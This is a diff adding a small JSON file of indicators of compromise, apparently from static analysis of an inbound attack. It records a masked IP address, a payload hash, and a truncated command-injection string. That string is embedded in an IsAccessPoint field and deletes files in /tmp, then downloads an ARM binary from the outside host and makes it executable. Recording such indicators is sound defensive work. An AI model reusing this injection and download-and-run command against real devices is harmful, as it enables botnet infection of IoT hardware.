@@ -1,0 +1,20 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "201.51.13.XXX"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "89fc3148f76cccb68b9f4ffa91764fefdb76bc648c2b66b8275cf3b4e6828253"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "<IsAccessPoint>`cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\\/201.51.13.XXX/main_arm7;chmod%2B777%2Bmai"
+  }
+]
